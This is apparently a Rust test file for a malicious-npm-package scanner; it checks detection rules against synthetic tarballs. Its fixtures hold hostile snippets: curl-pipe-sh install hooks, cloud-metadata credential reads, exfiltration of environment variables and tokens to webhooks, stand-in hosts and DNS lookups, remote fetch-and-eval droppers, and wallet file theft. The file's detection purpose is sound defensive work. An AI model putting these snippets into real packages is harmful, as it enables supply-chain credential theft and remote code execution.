//! End-to-end rule tests against synthetic packages, using
//! `NpmEcosystem` as the front-end so the assertions cover the
//! tarball → manifest → walk → rule path actually used in production.

use flate2::write::GzEncoder;
use flate2::Compression;
use monomi_core::{
    AnalysisCtx, ArtifactId, Capability, Corpus, Ecosystem, EcosystemId, HashAlgo, Integrity,
    Stage1Verdict,
};
use monomi_npm::NpmEcosystem;
use monomi_rules::{default_ruleset, run};
use tar::{Builder, Header};

fn build_tgz(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    {
        let mut b = Builder::new(&mut gz);
        for (path, data) in files {
            let mut h = Header::new_gnu();
            h.set_path(path).unwrap();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            b.append(&h, *data).unwrap();
        }
        b.finish().unwrap();
    }
    gz.finish().unwrap()
}

fn analyze(bytes: Vec<u8>) -> monomi_core::Stage1Result {
    let tar = monomi_core::Tarball {
        source_url: None,
        bytes,
    };
    let eco = NpmEcosystem::new();
    let manifest = eco.parse_manifest(&tar).unwrap();
    let lifecycle = eco.lifecycle_entrypoints(&tar, &manifest).unwrap();
    let entries = eco.walk(&tar).unwrap();
    let artifact = ArtifactId {
        ecosystem: EcosystemId::Npm,
        name: manifest.name.clone(),
        version: manifest.version.clone(),
        integrity: Integrity::from_bytes(HashAlgo::Sha512, &tar.bytes),
    };
    let corpus = Corpus::default();
    let ast_cache = monomi_ast::AstCache::new();
    let ctx = AnalysisCtx {
        artifact: &artifact,
        manifest: &manifest,
        lifecycle: &lifecycle,
        entries: &entries,
        diff: None,
        registry: None,
        corpus: &corpus,
        ast: Some(&ast_cache),
    };
    run(&default_ruleset(), &ctx).stage1
}

#[test]
fn clean_package_is_clean() {
    let pkg = r#"{ "name": "clean-pkg", "version": "1.0.0" }"#;
    let body = "module.exports = function add(a, b) { return a + b; };\n";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", body.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(s.findings.is_empty(), "got findings: {:?}", s.findings);
    assert_eq!(s.verdict, Stage1Verdict::Clean);
}

#[test]
fn capabilities_aggregate_from_findings_into_stage1_result() {
    // A postinstall that fetches over HTTPS must surface
    // LifecycleInstall + InstallTimeNetwork + NetHttp in the
    // aggregated capability set — this is the substrate the M8
    // version-over-version diff rule consumes.
    let pkg = r#"{
        "name": "fetchy",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node -e \"require('https').get('https://example.com/probe')\""
        }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    assert!(
        s.capabilities.contains(&Capability::LifecycleInstall),
        "missing LifecycleInstall in {:?}",
        s.capabilities,
    );
    assert!(
        s.capabilities.contains(&Capability::InstallTimeNetwork),
        "missing InstallTimeNetwork in {:?}",
        s.capabilities,
    );
    assert!(
        s.capabilities.contains(&Capability::NetHttp),
        "missing NetHttp in {:?}",
        s.capabilities,
    );
}

#[test]
fn lifecycle_script_alone_is_suspicious_not_malicious() {
    let pkg = r#"{
        "name": "with-hook",
        "version": "1.0.0",
        "scripts": { "postinstall": "node ./hook.js" }
    }"#;
    let hook = "console.log('hi');";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/hook.js", hook.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert_eq!(ids, vec!["NPM001"]);
    // Info severity contributes 0 to score → Clean per current heuristic.
    assert_eq!(s.verdict, Stage1Verdict::Clean);
}

#[test]
fn cloud_metadata_ip_in_postinstall_is_blocked() {
    let pkg = r#"{
        "name": "stealer",
        "version": "0.0.1",
        "scripts": {
            "postinstall": "node -e \"require('http').get('http://169.254.169.254/latest/meta-data/iam/security-credentials/')\""
        }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let fired: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(fired.contains(&"NPM006"), "expected NPM006, got {fired:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn cloud_metadata_ip_in_source_is_blocked() {
    let pkg = r#"{ "name": "stealer2", "version": "0.0.1" }"#;
    let src = r#"
        const http = require('http');
        http.get('http://metadata.google.internal/computeMetadata/v1/');
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(s.findings.iter().any(|f| f.rule_id == "NPM006"));
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn large_base64_plus_eval_is_blocked() {
    let pkg = r#"{ "name": "obfuscated", "version": "0.0.1" }"#;
    let blob: String = "A".repeat(2048);
    let src = format!("const x = '{blob}'; eval(Buffer.from(x, 'base64').toString());");
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(s.findings.iter().any(|f| f.rule_id == "NPM005"));
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn postinstall_with_child_process_fires_npm002() {
    // Body has BOTH the require('child_process') (NPM002, defer)
    // and the literal `curl … | sh` payload string (NPM019,
    // decisive). The combined verdict is therefore Malicious,
    // driven by NPM019.
    let pkg = r#"{
        "name": "spawner",
        "version": "0.0.1",
        "scripts": { "postinstall": "node -e \"require('child_process').exec('curl evil | sh')\"" }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM002"), "expected NPM002, got {ids:?}");
    assert!(ids.contains(&"NPM019"), "expected NPM019, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn postinstall_with_only_child_process_is_suspicious() {
    // Without the `curl | sh` literal NPM019 doesn't fire, so only
    // NPM002 (defer) remains and the verdict stays Suspicious.
    let pkg = r#"{
        "name": "spawner-quiet",
        "version": "0.0.1",
        "scripts": { "postinstall": "node -e \"require('child_process').exec('echo hi')\"" }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM002"), "expected NPM002, got {ids:?}");
    assert!(!ids.contains(&"NPM019"), "unexpected NPM019, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Suspicious);
}

#[test]
fn env_bulk_harvest_in_postinstall_fires_npm004() {
    let pkg = r#"{
        "name": "harvester",
        "version": "0.0.1",
        "scripts": { "postinstall": "node -e \"console.log(JSON.stringify(process.env))\"" }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM004"), "expected NPM004, got {ids:?}");
}

#[test]
fn discord_webhook_literal_is_blocked() {
    let pkg = r#"{ "name": "leaker", "version": "0.0.1" }"#;
    let src = r#"
        const url = 'https://discord.com/api/webhooks/12345/abcdef';
        fetch(url, { method: 'POST', body: JSON.stringify(process.env) });
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM007"), "expected NPM007, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn ssh_path_literal_is_suspicious() {
    // High-but-not-decisive: legitimate libraries (paramiko-ish
    // wrappers, ssh-config readers) embed `~/.ssh/...` so this
    // rule defers to Stage 2 instead of unilaterally blocking.
    let pkg = r#"{ "name": "key-thief", "version": "0.0.1" }"#;
    let src = "const p = require('os').homedir() + '/.ssh/id_rsa';";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM008"), "expected NPM008, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Suspicious);
}

#[test]
fn launchagents_literal_is_suspicious() {
    let pkg = r#"{ "name": "persister", "version": "0.0.1" }"#;
    let src = "const dst = '~/Library/LaunchAgents/com.evil.plist';";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(s.findings.iter().any(|f| f.rule_id == "NPM008"));
    assert_eq!(s.verdict, Stage1Verdict::Suspicious);
}

#[test]
fn undeclared_native_binary_fires_npm009() {
    let pkg = r#"{ "name": "sneaky", "version": "0.0.1" }"#;
    // Mach-O 64 magic bytes — classify() will tag this as NativeBinary.
    let mach_o = b"\xCF\xFA\xED\xFE\x07\x00\x00\x01rest-of-binary";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/payload.bin", mach_o),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM009"), "expected NPM009, got {ids:?}");
}

#[test]
fn declared_native_binary_is_clean() {
    let pkg = r#"{
        "name": "legit-tool",
        "version": "0.0.1",
        "bin": { "legit-tool": "./bin/tool" }
    }"#;
    let mach_o = b"\xCF\xFA\xED\xFE\x07\x00\x00\x01rest-of-binary";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/bin/tool", mach_o),
    ]);
    let s = analyze(bytes);
    assert!(
        s.findings.iter().all(|f| f.rule_id != "NPM009"),
        "false-positive NPM009: {:?}",
        s.findings
    );
}

#[test]
fn wallet_path_literal_is_blocked() {
    let pkg = r#"{ "name": "drainer", "version": "0.0.1" }"#;
    let src = r#"
        const p = require('os').homedir() +
            '/Library/Application Support/Exodus/exodus.wallet/seed.seco';
        const data = require('fs').readFileSync(p);
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM010"), "expected NPM010, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn metamask_extension_id_is_blocked() {
    let pkg = r#"{ "name": "extension-snoop", "version": "0.0.1" }"#;
    // MetaMask extension ID embedded — no legitimate npm reason.
    let src = "const id = 'nkbihfbeogaeaoehlefnkodbefgpgknn';";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(s.findings.iter().any(|f| f.rule_id == "NPM010"));
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn npm_token_read_in_postinstall_is_blocked() {
    let pkg = r#"{
        "name": "tokenstealer",
        "version": "0.0.1",
        "scripts": { "postinstall": "node -e \"fetch('http://x/', {body: process.env.NPM_TOKEN})\"" }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM011"), "expected NPM011, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn github_token_in_source_is_suspicious_not_blocked() {
    // A legit CI helper library *does* read GITHUB_TOKEN at
    // runtime, so source-level matches defer to Stage 2.
    let pkg = r#"{ "name": "gh-helper", "version": "0.0.1" }"#;
    let src = "const t = process.env.GITHUB_TOKEN; module.exports = { t };";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        ids.contains(&"NPM011"),
        "expected NPM011 (defer), got {ids:?}"
    );
    assert_eq!(s.verdict, Stage1Verdict::Suspicious);
}

#[test]
fn bundle_dependencies_fires_npm012() {
    let pkg = r#"{
        "name": "bundler",
        "version": "0.0.1",
        "bundleDependencies": ["hidden-pkg-a", "hidden-pkg-b"]
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM012"), "expected NPM012, got {ids:?}");
}

#[test]
fn dynamic_require_with_base64_buffer_fires_npm013() {
    let pkg = r#"{ "name": "loader", "version": "0.0.1" }"#;
    let src = "const m = require(Buffer.from('Zm9v', 'base64').toString());";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM013"), "expected NPM013, got {ids:?}");
}

#[test]
fn static_require_is_clean_for_npm013() {
    let pkg = r#"{ "name": "normal", "version": "0.0.1" }"#;
    let src = "const fs = require('fs');\nconst path = require('path');";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(
        s.findings.iter().all(|f| f.rule_id != "NPM013"),
        "false-positive NPM013: {:?}",
        s.findings
    );
}

#[test]
fn typosquat_fires_against_default_corpus() {
    // Same shape as our pipeline: real corpus + offline (no
    // registry metadata, so recency gate falls through to fire).
    let pkg = r#"{ "name": "loadash", "version": "0.0.1" }"#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", b"".as_slice()),
    ]);
    let tar = monomi_core::Tarball {
        source_url: None,
        bytes,
    };
    let eco = NpmEcosystem::new();
    let manifest = eco.parse_manifest(&tar).unwrap();
    let lifecycle = eco.lifecycle_entrypoints(&tar, &manifest).unwrap();
    let entries = eco.walk(&tar).unwrap();
    let artifact = ArtifactId {
        ecosystem: EcosystemId::Npm,
        name: manifest.name.clone(),
        version: manifest.version.clone(),
        integrity: Integrity::from_bytes(HashAlgo::Sha512, &tar.bytes),
    };
    let corpus = monomi_rules::default_corpus();
    let ctx = AnalysisCtx {
        artifact: &artifact,
        manifest: &manifest,
        lifecycle: &lifecycle,
        entries: &entries,
        diff: None,
        registry: None,
        corpus: &corpus,
        ast: None,
    };
    let s = run(&monomi_rules::default_ruleset(), &ctx).stage1;
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM014"), "expected NPM014, got {ids:?}");
}

#[test]
fn typosquat_no_fp_for_top_package_itself() {
    let pkg = r#"{ "name": "lodash", "version": "4.17.21" }"#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", b"".as_slice()),
    ]);
    let tar = monomi_core::Tarball {
        source_url: None,
        bytes,
    };
    let eco = NpmEcosystem::new();
    let manifest = eco.parse_manifest(&tar).unwrap();
    let lifecycle = eco.lifecycle_entrypoints(&tar, &manifest).unwrap();
    let entries = eco.walk(&tar).unwrap();
    let artifact = ArtifactId {
        ecosystem: EcosystemId::Npm,
        name: manifest.name.clone(),
        version: manifest.version.clone(),
        integrity: Integrity::from_bytes(HashAlgo::Sha512, &tar.bytes),
    };
    let corpus = monomi_rules::default_corpus();
    let ctx = AnalysisCtx {
        artifact: &artifact,
        manifest: &manifest,
        lifecycle: &lifecycle,
        entries: &entries,
        diff: None,
        registry: None,
        corpus: &corpus,
        ast: None,
    };
    let s = run(&monomi_rules::default_ruleset(), &ctx).stage1;
    assert!(
        s.findings.iter().all(|f| f.rule_id != "NPM014"),
        "false-positive NPM014 on a top package itself: {:?}",
        s.findings
    );
}

#[test]
fn encoded_http_bytes_decimal_is_blocked() {
    let pkg = r#"{ "name": "encoded", "version": "0.0.1" }"#;
    // 104,116,116,112,115 = "https"
    let src = "const u = String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108);";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM015"), "expected NPM015, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn encoded_http_bytes_hex_is_blocked() {
    let pkg = r#"{ "name": "encoded2", "version": "0.0.1" }"#;
    let src = "const u = [0x68, 0x74, 0x74, 0x70, 0x73].map(c => String.fromCharCode(c));";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(s.findings.iter().any(|f| f.rule_id == "NPM015"));
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn unrelated_byte_array_is_clean_for_npm015() {
    let pkg = r#"{ "name": "encoded3", "version": "0.0.1" }"#;
    // SHA-256 hash bytes — not http
    let src = "const h = [0xde, 0xad, 0xbe, 0xef, 0x42, 0x99];";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(
        s.findings.iter().all(|f| f.rule_id != "NPM015"),
        "false-positive NPM015: {:?}",
        s.findings
    );
}

#[test]
fn raw_github_fetch_in_postinstall_is_blocked() {
    let pkg = r#"{
        "name": "dropper",
        "version": "0.0.1",
        "scripts": { "postinstall": "node -e \"fetch('https://raw.githubusercontent.com/x/y/main/payload.js').then(r=>r.text()).then(eval)\"" }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM017"), "expected NPM017, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn self_delete_payload_is_blocked() {
    let pkg = r#"{ "name": "antiforensics", "version": "0.0.1" }"#;
    let src = "require('fs').unlinkSync(__filename);\nrun_payload();";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM018"), "expected NPM018, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn curl_pipe_sh_in_postinstall_is_blocked() {
    let pkg = r#"{
        "name": "downloader",
        "version": "0.0.1",
        "scripts": { "postinstall": "curl -sSL https://evil/install.sh | sh" }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM019"), "expected NPM019, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn eval_atob_chain_is_blocked() {
    let pkg = r#"{ "name": "evalatob", "version": "0.0.1" }"#;
    let src = "eval(atob('Y29uc29sZS5sb2coJ3hzcycp'));";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM020"), "expected NPM020, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn files_field_mismatch_fires_npm021() {
    let pkg = r#"{
        "name": "stealth",
        "version": "0.0.1",
        "main": "index.js",
        "files": ["index.js", "lib/"]
    }"#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", b"module.exports = 1;".as_slice()),
        ("package/lib/util.js", b"module.exports = 2;".as_slice()),
        // Not in `files` and not implicit → extra file.
        ("package/hidden.js", b"// secret payload".as_slice()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM021"), "expected NPM021, got {ids:?}");
}

#[test]
fn files_field_match_is_clean_for_npm021() {
    let pkg = r#"{
        "name": "wellformed",
        "version": "0.0.1",
        "main": "index.js",
        "files": ["index.js", "lib/"]
    }"#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", b"module.exports = 1;".as_slice()),
        ("package/lib/util.js", b"module.exports = 2;".as_slice()),
        ("package/README.md", b"# hi".as_slice()),
        ("package/LICENSE", b"MIT".as_slice()),
    ]);
    let s = analyze(bytes);
    assert!(
        s.findings.iter().all(|f| f.rule_id != "NPM021"),
        "false-positive NPM021: {:?}",
        s.findings
    );
}

#[test]
fn bidi_override_is_blocked() {
    let pkg = r#"{ "name": "trojan-source", "version": "0.0.1" }"#;
    // U+202E RLO inside source — Trojan Source pattern.
    let src = "const access_level = \u{202E}'user';"; // \u{202E} = RLO
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM022"), "expected NPM022, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn zero_width_char_is_suspicious() {
    let pkg = r#"{ "name": "zw", "version": "0.0.1" }"#;
    // U+200B zero-width space inside an identifier-ish position.
    let src = "const ad\u{200B}min = true;";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(s.findings.iter().any(|f| f.rule_id == "NPM022"));
}

#[test]
fn install_time_outbound_http_fires_npm023() {
    let pkg = r#"{
        "name": "fetcher",
        "version": "0.0.1",
        "scripts": { "postinstall": "node -e \"require('https').get('https://example.com/x')\"" }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM023"), "expected NPM023, got {ids:?}");
}

#[test]
fn stratum_pool_url_is_blocked() {
    let pkg = r#"{ "name": "minerpkg", "version": "0.0.1" }"#;
    let src = "const pool = 'stratum+tcp://pool.minexmr.com:4444';";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM024"), "expected NPM024, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn coinhive_library_name_is_blocked() {
    let pkg = r#"{ "name": "throwback", "version": "0.0.1" }"#;
    let src = "var miner = new CoinHive.Anonymous('site-key');";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(s.findings.iter().any(|f| f.rule_id == "NPM024"));
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn dns_lookup_with_concat_fires_npm025() {
    let pkg = r#"{ "name": "dnstun", "version": "0.0.1" }"#;
    let src = r#"
        const dns = require('dns');
        const token = process.env.SECRET;
        dns.lookup(token + '.attacker.com', () => {});
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM025"), "expected NPM025, got {ids:?}");
}

#[test]
fn dns_lookup_literal_is_clean_for_npm025() {
    let pkg = r#"{ "name": "literal-dns", "version": "0.0.1" }"#;
    let src = "require('dns').lookup('example.com', () => {});";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(
        s.findings.iter().all(|f| f.rule_id != "NPM025"),
        "false-positive NPM025: {:?}",
        s.findings
    );
}

#[test]
fn script_tag_in_readme_is_blocked() {
    let pkg = r#"{ "name": "doc-smuggle", "version": "0.0.1" }"#;
    let readme = b"# Hello\n\n<script>alert(1)</script>\n";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/README.md", readme.as_slice()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM026"), "expected NPM026, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn publish_time_dangerous_api_fires_npm027() {
    let pkg = r#"{
        "name": "publish-evil",
        "version": "0.0.1",
        "scripts": {
            "prepublishOnly": "node -e \"require('child_process').exec('curl evil')\""
        }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM027"), "expected NPM027, got {ids:?}");
}

#[test]
fn future_date_now_comparison_fires_npm028() {
    let pkg = r#"{ "name": "ticker", "version": "0.0.1" }"#;
    // Year-2100 ms-since-epoch — well past current time.
    let src = "if (Date.now() > 4102444800000) { activate(); }";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM028"), "expected NPM028, got {ids:?}");
}

#[test]
fn past_date_now_comparison_is_clean_for_npm028() {
    let pkg = r#"{ "name": "history", "version": "0.0.1" }"#;
    // Year-2000 timestamp — already in the past, common sanity-check
    // shape (`if (Date.now() < 946684800000) throw 'clock broken';`).
    let src = "if (Date.now() < 946684800000) { throw new Error('clock broken'); }";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(
        s.findings.iter().all(|f| f.rule_id != "NPM028"),
        "false-positive NPM028: {:?}",
        s.findings
    );
}

#[test]
fn large_base64_without_eval_is_clean() {
    let pkg = r#"{ "name": "icon-pkg", "version": "0.0.1" }"#;
    let blob: String = "A".repeat(2048);
    // No eval / Function / vm.runIn* anywhere — just a data URI.
    let src = format!("module.exports = {{ icon: 'data:image/png;base64,{blob}' }};");
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    assert!(
        s.findings.iter().all(|f| f.rule_id != "NPM005"),
        "false-positive NPM005: {:?}",
        s.findings
    );
}

#[test]
fn secret_material_literal_in_source_fires_npm033() {
    let pkg = r#"{ "name": "wallet-stealer", "version": "1.0.0" }"#;
    let src = r#"
const MNEMONIC = process.env.MNEMONIC;
const PRIVATE_KEY = "0xabcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
fetch("http://x/" + PRIVATE_KEY);
"#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM033"), "got {ids:?}");
    assert!(s
        .capabilities
        .contains(&monomi_core::Capability::SecretMaterial));
}

#[test]
fn npm_publish_in_postinstall_fires_npm034_critical() {
    // Shai-Hulud worm shape: postinstall re-publishes the
    // installing user's other packages.
    let pkg = r#"{
        "name": "worm",
        "version": "1.0.0",
        "scripts": { "postinstall": "node steal.js && npm publish ./other-pkg" }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let n34: Vec<_> = s.findings.iter().filter(|f| f.rule_id == "NPM034").collect();
    assert_eq!(n34.len(), 1, "expected NPM034 fire, got {:?}", s.findings);
    assert_eq!(n34[0].severity, monomi_core::Severity::Critical);
    assert!(!n34[0].defers_to_stage2);
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn privesc_path_literal_fires_npm035() {
    let pkg = r#"{ "name": "recon", "version": "1.0.0" }"#;
    let src = r#"const passwd = require('fs').readFileSync('/etc/passwd', 'utf8');"#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM035"), "got {ids:?}");
}

#[test]
fn chmod_to_executable_in_postinstall_fires_npm036() {
    let pkg = r#"{
        "name": "dropper",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl -o ./helper https://x/pl && chmod +x ./helper && ./helper"
        }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM036"), "got {ids:?}");
}

#[test]
